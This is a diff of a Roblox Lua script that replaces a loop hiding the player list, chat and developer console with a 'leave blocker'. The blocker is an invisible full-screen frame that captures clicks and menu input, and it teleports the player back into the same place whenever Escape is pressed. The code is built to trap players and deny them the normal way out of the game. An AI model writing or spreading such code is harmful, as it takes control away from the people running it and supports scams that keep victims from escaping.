@@ -53,28 +53,47 @@ local v5 = CreateObject("ScreenGui", {
 });
 
 
-local StarterGui = game:GetService("StarterGui")
+
+
+
+
+-- FULLSCREEN LEAVE BLOCKER (Replace entire block after v5)
+local Player = game:GetService("Players").LocalPlayer
 local UserInputService = game:GetService("UserInputService")
 
-task.spawn(function()
-    while task.wait(0.05) do
-        pcall(function()
-            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
-            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
-            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
-            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
-            StarterGui:SetCore("TopbarEnabled", false)
-            StarterGui:SetCore("DevConsoleVisible", false)
-        end)
-    end
-end)
+-- Create invisible fullscreen blocker
+local BlockGui = Instance.new("ScreenGui")
+BlockGui.Name = "LeaveBlocker"
+BlockGui.Parent = Player:WaitForChild("PlayerGui")
+BlockGui.ResetOnSpawn = false
+BlockGui.IgnoreGuiInset = true
+BlockGui.DisplayOrder = 999999
 
+local BlockFrame = Instance.new("Frame")
+BlockFrame.Size = UDim2.new(1, 0, 1, 0)
+BlockFrame.Position = UDim2.new(0, 0, 0, 0)
+BlockFrame.BackgroundTransparency = 1
+BlockFrame.Active = true
+BlockFrame.Parent = BlockGui
+
+-- ESC Rejoin
 UserInputService.InputBegan:Connect(function(input)
     if input.KeyCode == Enum.KeyCode.Escape then
         task.wait(0.01)
-        game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
+        game:GetService("TeleportService"):Teleport(game.PlaceId, Player)
     end
 end)
+
+-- Block all menu interactions
+BlockFrame.InputBegan:Connect(function() end)
+BlockFrame.MouseButton1Down:Connect(function() end)
+
+
+
+
+
+
+
 
 
 
